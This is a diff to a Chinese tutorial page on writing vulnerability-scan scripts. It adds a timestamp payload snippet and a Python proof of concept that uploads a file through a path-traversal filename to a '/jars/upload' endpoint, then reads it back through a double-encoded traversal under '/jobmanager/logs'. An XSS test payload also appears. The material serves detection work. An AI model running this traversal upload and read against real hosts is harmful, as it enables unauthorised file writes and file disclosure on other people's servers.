@@ -163,7 +163,7 @@ if __name__ == '__main__':
 对于不同种类的漏洞，最好是有不同的检测方式，例如xray中采用了随机数值的方式检测SQL注入与XSS，那么使用随机数版本的漏扫脚本大概就是这样的：
 
 {% tabs %}
-{% tab title="Python" %}
+{% tab title="随机数" %}
 随机数版本所需代码如下：
 
 ```python
@@ -186,5 +186,60 @@ xss = "<script>alert(" + yuju + ")</script>"
 sqli = hashlib.md5(yuju).hexdigest()
 ```
 {% endtab %}
+
+{% tab title="时间戳" %}
+```python
+import time
+
+noww = int(time.time())
+now = str(noww)
+print now
+
+payloads = "/assets/config/config%s.json" % now
+```
+{% endtab %}
 {% endtabs %}
+
+文件上传的方式
+
+```python
+# -*- coding: utf-8 -*-
+
+import requests
+import random,hashlib
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+target = "https://IP:PORT"
+shuzhi = random.randint(0, 999999)
+yuju = str(shuzhi)
+mdfive = hashlib.md5(yuju).hexdigest()
+path = "/jars/upload"
+url = target + path
+boundry = "----WebKitFormBoundaryoZ8meKnrrso89R6Y"
+headers = {
+    "Host": target.split("://")[1],
+    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+}
+
+files = {'jarfile': ('../../../../../../tmp/flags', mdfive)}
+# proxy = {
+#     'http':'http://127.0.0.1:8081',
+#     'https':'https://127.0.0.1:8081'
+# }
+
+req = requests.post(url, headers=headers, files=files, timeout=10, verify=False)
+print req.content
+if req.status_code == 400:
+    print req.content
+    path_1 = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflags"
+    url_1 = target + path_1
+    req_1 = requests.get(url_1, headers=headers, timeout=10, verify=False)
+    print req_1.text
+
+    if req_1.status_code == 200:
+        print  "hahahaha"
+```
+
+
 
